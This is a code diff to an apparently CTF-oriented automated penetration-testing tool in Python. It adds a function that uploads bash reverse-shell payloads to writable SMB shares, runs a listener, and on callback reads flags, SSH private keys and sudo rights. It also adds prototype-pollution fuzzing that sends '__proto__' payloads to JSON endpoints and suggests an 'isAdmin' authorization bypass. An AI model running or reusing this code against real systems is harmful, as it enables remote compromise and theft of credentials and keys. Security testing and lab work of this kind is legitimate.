@@ -3242,6 +3242,9 @@ def run_ad_enum_unauth(target, services, outdir, args, tools, loot=None, domain=
             if m and m.group(1).upper() not in ('IPC$',):
                 sh = m.group(1)
                 good(f"  WRITABLE share: {sh}")
+                context.setdefault('writable_shares', [])
+                if sh not in context['writable_shares']:
+                    context['writable_shares'].append(sh)
                 if loot:
                     loot.add('auth_findings', f"writable SMB share: {sh} (file-drop / hash-capture / cron vector)")
                     loot.add_step(f"SMB: writable share {sh} -> drop payload / SCF-lnk hash capture / cron pickup")
@@ -4726,6 +4729,224 @@ def run_smb_symlink_traversal(target, services, outdir, args, tools, loot=None, 
     return vulns
 
 
+def run_writable_share_payload(target, services, outdir, args, tools, loot=None, context=None):
+    """Drop reverse-shell payloads into writable SMB shares (for boxes where a cron
+    or 'print/processing' job auto-executes dropped files), catch the callback on
+    --lhost/--lport, and auto-loot flags (id, user.txt, root.txt, SSH keys).
+    Active-gated; requires --lhost. General capability for writable-share RCE."""
+    vulns = []
+    context = context if context is not None else {}
+    writ = context.get('writable_shares') or []
+    lhost = getattr(args, 'lhost', None)
+    lport = int(getattr(args, 'lport', None) or 4444)
+    if not (active_enabled(args) and shutil.which('smbclient') and writ):
+        return vulns
+    if not lhost:
+        _recommend(loot, "re-run with --lhost <tun0-ip> --lport <port> to drop a reverse shell into "
+                   "the writable share and catch the callback if a job auto-runs it")
+        return vulns
+
+    import socket
+    import threading
+    subsection("Writable-Share Payload Drop + Catch")
+    caught = {'shell': False, 'out': ''}
+    loot_cmd = ('id; hostname; echo "==USERTXT=="; cat /home/*/user.txt 2>/dev/null; '
+                'echo "==ROOTTXT=="; cat /root/root.txt 2>/dev/null; '
+                'echo "==KEYS=="; cat /home/*/.ssh/id_rsa 2>/dev/null; '
+                'echo "==HOMES=="; ls -la /home 2>/dev/null; '
+                'echo "==SUDO=="; sudo -n -l 2>/dev/null\n')
+
+    def _listener():
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.bind(('0.0.0.0', lport))
+            s.listen(1)
+            s.settimeout(150)
+            conn, addr = s.accept()
+            caught['shell'] = True
+            good(f"  REVERSE SHELL from {addr[0]} !")
+            try:
+                conn.sendall(loot_cmd.encode())
+            except Exception:
+                pass
+            conn.settimeout(8)
+            data, t0 = b'', time.time()
+            while time.time() - t0 < 14:
+                try:
+                    chunk = conn.recv(4096)
+                    if not chunk:
+                        break
+                    data += chunk
+                except Exception:
+                    break
+            caught['out'] = data.decode('utf-8', 'ignore')
+            try:
+                conn.close()
+                s.close()
+            except Exception:
+                pass
+        except Exception as e:
+            caught['out'] = f'listener error: {e}'
+
+    th = threading.Thread(target=_listener, daemon=True)
+    th.start()
+    time.sleep(1)
+
+    pdir = outdir / 'share_payloads'
+    pdir.mkdir(exist_ok=True)
+    (pdir / 'p.sh').write_text(f'#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n')
+    # common names a cron/print-processor might pick up + auto-run
+    names = ['shell.sh', 'run.sh', 'print.sh', 'job.sh', 'cmd.sh', 'process.sh',
+             'autorun.sh', 'index.sh', 'test.sh', 'a.sh']
+    for sh in writ:
+        info(f"dropping reverse-shell payloads into //{target}/{sh}")
+        for n in names:
+            _run(['smbclient', f'//{target}/{sh}', '-N', '-c', f'put {pdir / "p.sh"} {n}'], timeout=20)
+        if loot:
+            loot.add_step(f"SMB: dropped reverse-shell payloads into writable share {sh}")
+
+    info(f"waiting up to 140s for a callback on {lhost}:{lport} (Ctrl-C safe)...")
+    th.join(timeout=145)
+    (outdir / 'reverse_shell_output.txt').write_text(caught['out'])
+    if caught['shell']:
+        good("  FOOTHOLD: reverse shell caught via writable share")
+        out = caught['out']
+        print(out[:2000])
+        if loot:
+            loot.scan_output(out)
+            for tag, cat in (('==USERTXT==', 'flags'), ('==ROOTTXT==', 'flags'), ('==KEYS==', 'keys')):
+                if tag in out:
+                    seg = out.split(tag, 1)[1].split('==', 1)[0].strip()
+                    if seg:
+                        loot.add(cat, f"{tag} {seg[:300]}")
+            loot.add_step("Foothold shell caught -> looted id/user.txt/root.txt/keys/sudo")
+        vulns.append({'port': 445, 'service': 'smb', 'product': 'Samba', 'version': '',
+                     'desc': 'RCE via auto-processed writable SMB share (reverse shell caught)',
+                     'cve': '', 'exploit': f'drop bash revshell in writable share; listener on {lport}',
+                     'severity': 'critical'})
+    else:
+        info("  no callback — dropped files are not auto-executed on this box")
+        _recommend(loot, f"inspect what consumes //{target}/<writable_share>; try the filetype the "
+                   f"'reception/printer' job expects (.ps/.pjl/.pdf/.job) or an ext a cron runs")
+    return vulns
+
+
+# ── Prototype pollution: client-side detection + server-side fuzzing (PPFuzz-style) ──
+# Known client-side PP-vulnerable libraries (name -> first FIXED version).
+_PP_VULN_LIBS = {
+    'lodash': '4.17.21', 'jquery': '3.5.0', 'angular': '1.8.0', 'hoek': '5.0.3',
+    'handlebars': '4.7.7', 'js-yaml': '3.13.1', 'minimist': '1.2.6',
+    'set-value': '3.0.1', 'merge': '2.1.1', 'deep-extend': '0.5.1',
+}
+# Server-side PP oracles: payload -> (detector, description). Persist in the JS process.
+_PP_ORACLES = [
+    ('{"__proto__":{"json spaces":8}}', 'jsonspaces',
+     'Express res.json() indentation pollution (json spaces)'),
+    ('{"constructor":{"prototype":{"json spaces":8}}}', 'jsonspaces',
+     'constructor.prototype json-spaces (filter bypass)'),
+    ('{"__proto__":{"status":510}}', 'status510',
+     'HTTP status pollution (status 510)'),
+]
+
+
+def _ver_lt(a, b):
+    """True if version a < version b (numeric dotted compare)."""
+    try:
+        pa = [int(x) for x in re.findall(r'\d+', a)][:3]
+        pb = [int(x) for x in re.findall(r'\d+', b)][:3]
+        return pa < pb
+    except Exception:
+        return False
+
+
+def run_prototype_pollution(url, port, corpus, outdir, args, tools, loot=None):
+    """Detect prototype pollution: (1) passive client-side — flag known-vulnerable JS
+    libraries + merge/__proto__ sinks; (2) active server-side fuzzing (PPFuzz-style) —
+    inject __proto__/constructor.prototype payloads into JSON endpoints and confirm
+    via server-side oracles (json-spaces indentation, status pollution). Gated."""
+    vulns = []
+    if not shutil.which('curl'):
+        return vulns
+    # ── (1) client-side: vulnerable library versions in script srcs ──
+    _, body, _ = _run(['curl', '-skL', '--max-time', '10', url], timeout=15)
+    for m in re.finditer(r'(?:src|href)=["\']([^"\']*?([a-z0-9_.-]+?)[.-]v?(\d+\.\d+\.\d+)[^"\']*\.js)["\']',
+                         body or '', re.I):
+        lib = m.group(2).lower().rstrip('.-')
+        ver = m.group(3)
+        for known, fixed in _PP_VULN_LIBS.items():
+            if known in lib and _ver_lt(ver, fixed):
+                good(f"  vulnerable lib: {lib} {ver} (< {fixed}) — prototype-pollution prone")
+                if loot:
+                    loot.add('auth_findings', f"outdated JS lib {lib} {ver} (<{fixed}) — prototype pollution")
+                vulns.append({'port': port, 'service': 'http', 'product': lib, 'version': ver,
+                             'desc': f'Outdated {lib} {ver} (fixed {fixed}) — prototype-pollution vulnerable',
+                             'cve': '', 'exploit': f'see prototype-pollution gadgets for {lib}',
+                             'severity': 'medium'})
+
+    # ── candidate endpoints: DYNAMICALLY discovered (gobuster + crawler + JS), never a static list ──
+    endpoints = set()
+    gb = outdir / f'gobuster_{port}.txt'          # gobuster dir brute results
+    if gb.exists():
+        for l in gb.read_text().splitlines():
+            seg = l.split()[0].strip() if l.strip() else ''
+            if seg:
+                endpoints.add(seg.strip('/'))
+    ep_file = outdir / 'js_endpoints.txt'          # endpoints extracted from JS
+    if ep_file.exists():
+        endpoints.update(l.strip('/').strip() for l in ep_file.read_text().splitlines() if l.strip())
+    for u in corpus.get('urls', []):               # crawler corpus paths
+        p = u.split('://', 1)[-1].split('/', 1)
+        if len(p) > 1 and p[1]:
+            endpoints.add(p[1].split('?')[0])
+    for u in corpus.get('params', []):             # parameterized endpoints from crawl
+        p = u.split('://', 1)[-1].split('/', 1)
+        if len(p) > 1 and p[1]:
+            endpoints.add(p[1].split('?')[0])
+    endpoints = {e for e in endpoints if e}
+
+    if not active_enabled(args):
+        _recommend(loot, f"PP fuzz: curl -s {url}/api/... -H 'Content-Type: application/json' "
+                   f"-d '{{\"__proto__\":{{\"json spaces\":8}}}}'  then re-request & check JSON indentation "
+                   f"(or {{\"constructor\":{{\"prototype\":{{\"isAdmin\":true}}}}}} for authz bypass)",
+                   "prototype pollution (PPFuzz-style) on JSON endpoints")
+        return vulns
+
+    # ── (2) server-side fuzzing with oracles ──
+    subsection("Prototype Pollution Fuzzing (server-side)")
+    from urllib.parse import urljoin
+    cj = outdir / f'pp_cookies_{port}'
+    _run(['curl', '-sk', '-c', str(cj), '--max-time', '8', url], timeout=12)  # seed a session
+    for ep in list(dict.fromkeys(endpoints))[:25]:
+        target_ep = urljoin(url.rstrip('/') + '/', ep)
+        for payload, oracle, desc in _PP_ORACLES:
+            _run(['curl', '-sk', '-b', str(cj), '-c', str(cj), '-X', 'POST', target_ep,
+                 '-H', 'Content-Type: application/json', '-d', payload, '--max-time', '8'], timeout=12)
+            # probe: request a JSON-returning endpoint and inspect for the oracle effect
+            code, probe, _ = _run(['curl', '-sk', '-b', str(cj), '-i', '--max-time', '8', target_ep], timeout=12)
+            hdr, _, pbody = probe.partition('\r\n\r\n')
+            if oracle == 'jsonspaces' and re.search(r'\{\n {8}"', pbody):
+                good(f"  PROTOTYPE POLLUTION confirmed at {target_ep} ({desc})")
+                if loot:
+                    loot.add('auth_findings', f"server-side prototype pollution: {target_ep} ({desc})")
+                    loot.add_step(f"Web: prototype pollution at {ep} -> try isAdmin/authz bypass gadget")
+                vulns.append({'port': port, 'service': 'http', 'product': 'Node.js app', 'version': '',
+                             'desc': f'Server-side prototype pollution at {ep} ({desc})', 'cve': '',
+                             'exploit': f"curl {target_ep} -H 'Content-Type: application/json' "
+                                        f"-d '{{\"__proto__\":{{\"isAdmin\":true}}}}'  # then hit admin route",
+                             'severity': 'critical'})
+                break
+            if oracle == 'status510' and re.search(r'(?im)^HTTP/\d\.\d 510', probe):
+                good(f"  PROTOTYPE POLLUTION confirmed at {target_ep} (status pollution)")
+                if loot:
+                    loot.add('auth_findings', f"server-side prototype pollution (status): {target_ep}")
+                vulns.append({'port': port, 'service': 'http', 'product': 'Node.js app', 'version': '',
+                             'desc': f'Server-side prototype pollution at {ep} (status oracle)', 'cve': '',
+                             'exploit': f"pollute Object.prototype via {ep}", 'severity': 'critical'})
+                break
+    return vulns
+
+
 def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None, hostnames=None):
     """Phase 5: Supplementary Tool Enumeration (vhosts, web, SMB, NFS, FTP, TLS, nuclei).
     Returns list of additional structured vuln findings discovered in phase 5."""
@@ -5004,6 +5225,7 @@ def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None,
         fp = fingerprint_stack(url, port, outdir, loot)
         js_urls, _links = harvest_page_intel(url, port, outdir, loot)
         shellshock_vulns += analyze_js(js_urls, outdir, args, loot)
+        shellshock_vulns += run_prototype_pollution(url, port, pc, outdir, args, tools, loot)
         fetch_robots_sitemap(url, outdir, loot)
         # dirs from gobuster output + crawl corpus paths feed the listing/broken-perm check
         _dirs = set()
@@ -5396,6 +5618,8 @@ def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None,
     shellshock_vulns += run_share_mining(target, services, outdir, args, tools, loot)
     # 1c. Samba symlink traversal on writable shares -> arbitrary file read (SSH keys/flags)
     shellshock_vulns += run_smb_symlink_traversal(target, services, outdir, args, tools, loot, context=p5_context)
+    # 1d. Drop reverse-shell payloads into writable shares + catch (auto-processed shares)
+    shellshock_vulns += run_writable_share_payload(target, services, outdir, args, tools, loot, context=p5_context)
     # 2. Credential brute against auth services (consumes ad_users.txt)
     shellshock_vulns += run_credential_attacks(target, services, outdir, args, tools, loot,
                                                context=p5_context)
